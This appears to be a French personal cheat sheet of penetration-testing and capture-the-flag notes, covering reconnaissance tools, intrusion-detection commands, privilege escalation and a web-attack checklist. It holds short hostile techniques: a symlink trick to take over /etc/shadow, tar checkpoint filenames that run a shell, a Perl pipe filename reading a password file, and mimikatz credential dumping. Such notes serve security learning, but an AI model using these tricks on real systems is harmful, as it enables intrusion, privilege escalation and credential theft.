<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
  <title>Methode - hacking</title>
</head>
[index](index.html)

## Hacking machines

### Utilisation de Kali

- Installer une full pour avoir metasploit
- Les wordlists sont dans /usr/share/wordlists

### Découverte environnement

- robots.txt
- Fingerprinting : $ whatweb -v -a 3 192.168.0.xxx
- Recherche de répertoires existant: nikto ou simplement wfuzz: $wfuzz --hc 404 -w wordlist http://www.cible.com/FUZZ

### Recherche vulnerabilités


- Banner grabbing: $nc [ip] [port] : ex donne info sur serveur web.
- NeXpose (Rapid7), possibilite de sauver le report en xml pour relecture dans msf. Il existe aussi plugin "nexpose" pour msf.
- Nessus (Tenable Security). Il existe aussi plugin "nessus" pour msf.
- OpenVAS : Fork Open Source de Nessus (qui est devenu close) - Installé sur https://127.0.0.1:9392. Se paramètre via openvasmd, par exemple pour reinit le password d'admin:
    $ openvasmd --user=admin --new-password=letmein. Il y a aussi plusieurs outils d'admin comme openvas-check-setup, openvas-setup...
    
  Pour lancer un scan depuis l'interface : Menu Scans / tasks. Clicker sur l'icone violette avec une baguette "task wizard" et entre l'url à scanner

### Détection intrusion

- who et w : utilisateurs connectés
- last : dernières connexions
- lastb : derniers echecs de connexion
- /var/log/auth.log : plus complet sur différents moyens de connexion
- history : historique des commandes de l'utilisateur
- ac (package acct) avec l'option "-dp" : temps de connexion de chaque utilisateur
- lastcomm (package acct) : dernières commandes exécutées sur le système
- netstat (-t,-u,-p,-l,-a,-n) : ports réseaux du système
- lsof : liste des ressources (files, pipes...) en cours d'utilisation...). Option -p pour filtrer sur un processus, -u pour un user
- Vérifier aussi crontab


### [Metasploit](hacking-metasploit.html)

### Wargame - Elevation de privilege

## Generalités

- Consulter http://exploit-db.com, http://cve.mitre.org, http://cert.ssi.gouv.fr ou encore http://www.cvedetails.com (requetable automatiquement).
- Consulter /etc/sudoers (dès fois que ça fonctionne) et $crontab -l pour voir s'il y a des taches planifiées à exploiter
- Pour faire un sudo ou su, il demande parfois à être dans un terminal, ce qui ne fonctionne pas avec tous les webshells. Il suffit parfois de lancer :
$ python -c 'import pty;pty.spawn("/bin/sh")'


## Ubuntu non patche (versions 9.10 et 10.04):
$rm -rf ~/.cache
$ln -s /etc/shadow ~/.cache
$ssh localhost

Vous voila propriétaire du fichier /etc/shadow !

## Execution de commandes détournées (exploit suid)
- S'il y a un "tar cvf *" par exemple, il est possible de passer des arguments sous forme de nom de fichiers. Notamment en créants des fichiers appelés --checkpoint=1 --checkpoint-action=exec=sh shell.sh et shell.sh.

### Exploit windows

L'utilisation de mimikatz permet de retrouver des credentials, par exemple à partir d'un dump mémoire

## Hacking web

### Recherche de vulnerabilités
- DirBuster : projet owasp (arrêté) pour bruteforcer l'arborescence d'un site web. Remplacé par ZAP
- Owasp ZAP (Zed Attack Proxy) - Recherche de vulns sur un site web
- BurpSuite : suite d'outils (proxy web, ...)
- Wapiti, nikto...
- Pour rechercher les répertoires classiques : $dirb http://challenge01.root-me.org/realiste/ch7/ /usr/share/dirb/wordlists/common.txt

### Les attaques
- Regarder le source généré (CTRL+U sur Firefox)
- Regarder les autres fichiers chargés (y.c leur code source, notamment pour js et css)
- Lire le header de retour
- Modification du user-agent ou autres parties header
- Décoder le fonctionnement du javascript
- Tester les user/pwd triviaux. 
- Fichiers backup (~, bak, old, sav)
- Regarder si un fichier robots.txt est présent
- Fichiers autogénérés comme .pyc si site en python
- La présence d'un répertoire de livraison
- La présente du répertoire .git/ ou .svn... ou même /git
- Injection de paramètre : comme dans sqli on peut fermer les apostrophes ou braquets et rajouter d'autre code
- [XSS injection](xss.html)
- XXE : un peu comme XSS mais grace aux entités et aux dtd. A noter qu'on peut faire des XXE permettant d'envoyer le résultat avant la fin de la page.
- XSL : il est possible de faire des choses sympa si on peut modifier le xsl : connaître le moteur xsl et sa version, dans certains cas injecter des commandes, lire des documents choisis (ou en partie), voire même écrire.
- Injection sql (blind, différents moteurs, time attack, tables systèmes)
- Injection xpath (cf sql)
- LFI : upload de fichier (mime, extension, php dans fichier, null byte dans nom) + moyen executer
- Modification du cookie
- Directory indexing/traversing - Essayer de deviner les répertoires
- Fichiers/répertoire d'install
- CRLF : permet de leurrer utilisateur, ou mailer
- Utilisation de fiddler ou wireshark pour voir ce qui est vraiment échangé sur le réseau
- S'il est possible d'uploader des fichiers compressés (ou au moins .tar) qui seront décompressés : mettre un symlink 

### Les attaques PHP
- PHP : register globals (pour les var non initialisées) - vieilles versions
- [PHP wrappers](phpwrappers.html) : affiche contenu des fichiers php...
- Contournement de filtre : la commande chr() peut accepter des valeurs négatives (complément à 256)
- Contournement de filtre : un preg_replace("/^blabla/"...) peut être trompé par une chaîne commençant par un "\n..."
- Passer en argument un array (de type user[]) là où il s'attend à une valeur classique donne parfois des résultats intéressants
- Les conversions implicites sont une source de faille. Les différentes manières d'écrire des nombres (par exemple forme exponentielle 5.14e18) peut rajouter de la confusion en laissant le champ à 2 interprétations selon le contexte 
- $_SERVER['HTTP_HOST'] peut être modifié par le header "Host"

### Les attaques Perl
- On peut utiliser des pipes dans un open de perl, par exemple si on appelle un fichier "|cat .passwd"...

### Les attaques Python
- S'il y a des imports, on peut modifier le $PYTHONPATH pour regarder d'abord dans /tmp par exemple
- Jailbreak : utiliser notamment https://docs.python.org/2/library/inspect.html. Par exemple .func_code, .co_code, .co_consts

### Javascript
- Il existe des deobfuscator online. Il existe aussi le jsfuck, du javascript valide écrit uniquement avec les 18 symboles "[]()!+,\"$.:;_{}~=."
- Il faut parfois faire des replace à la main
- Attention aux conversions implicites en chaîne ou int selon le contexte

### Les outils

#### Créer un serveur web pour ses attaques
- Serveur web avec netcat : while true; do nc -l -p 8080 < index.html; done 
Note: Utiliser en fait nc.traditional au lieu de nc
- Connaitre son ip, par exemple : http://www.monip.org
- Pour rendre un répertoire disponible via le web, lancer dans ce répertoire :  "python -m SimpleHTTPServer [port]"

#### Autres
1. md5sum : Pour générer la somme md5. Ex: echo bob | md5sum

- python -c "import crypt, getpass, pwd; print crypt.crypt('password', '\$6\$salt\$')"
=> pour creer /etc/shadow

- Serveur web avec netcat : while true; do nc -l -p 8080 < index.html; done 
UTILISER EN FAIT nc.traditional au lieu de nc
http://www.monip.org : 82.238.192.170



- Manipuler de l'hexa : xxd et hd

## Hacking imprimantes

Il semble que [PRET](https://github.com/RUB-NDS/PRET) PRinter Exploitation Toolkit (outils pythons) soit pas mal utilisé.


